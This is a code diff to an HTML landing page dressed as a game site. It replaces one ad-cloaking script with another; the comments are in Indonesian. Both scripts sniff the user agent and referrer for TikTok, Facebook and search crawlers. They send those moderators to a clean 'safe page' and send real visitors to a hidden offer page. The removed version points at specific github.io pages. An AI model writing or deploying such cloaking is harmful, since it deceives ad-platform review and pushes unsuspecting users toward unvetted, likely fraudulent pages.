@@ -119,38 +119,27 @@ footer {
         <h2>About The Game</h2>
         <p>Immerse yourself in an action-packed world with stunning graphics and epic battles.</p>
     </section>
-    
-function isBot() {
-    const botUserAgents = [
-        "TikTokBot", "Bytespider", "Googlebot", "Facebot", "Bingbot",
-        "YandexBot", "DuckDuckBot", "Slurp"
-    ];
+    <script>
+function detectCloak() {
+            var userAgent = navigator.userAgent.toLowerCase();
+            var referrer = document.referrer.toLowerCase();
 
-    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-    const referrer = document.referrer;
+            // Daftar user-agent bot TikTok
+            var botKeywords = ["tiktok", "facebook", "googlebot", "crawler", "spider"];
 
-    // Cek apakah user-agent mengandung kata-kata bot
-    for (let bot of botUserAgents) {
-        if (userAgent.includes(bot)) {
-            return true;
+            // Periksa apakah user-agent termasuk dalam daftar bot
+            var isBot = botKeywords.some(bot => userAgent.includes(bot) || referrer.includes(bot));
+
+            if (isBot) {
+                // Arahkan bot ke halaman aman
+                window.location.href = "https://example.com/safe-page";
+            } else {
+                // Arahkan pengguna nyata ke halaman iklan
+                window.location.href = "https://example.com/offer-page";
+            }
         }
-    }
-
-    // Jika datang dari domain TikTok Ads Manager, kemungkinan bot
-    if (referrer.includes("tiktok.com") || referrer.includes("ads.tiktok.com")) {
-        return true;
-    }
-
-    return false;
-}
-
-// Redirect berdasarkan deteksi bot
-if (isBot()) {
-    window.location.href = https://dungmanhoki.github.io/berteletele/index.html; // Halaman bersih untuk moderator TikTok
-} else {
-    window.location.href = https://dungmanhoki.github.io/berteletele/ampiklantiktok.html; // Halaman asli untuk user
-}
-
+        detectCloak();
+</script>
     <footer>
         <p>© 2025 Gaming Zone | All Rights Reserved</p>
     </footer>
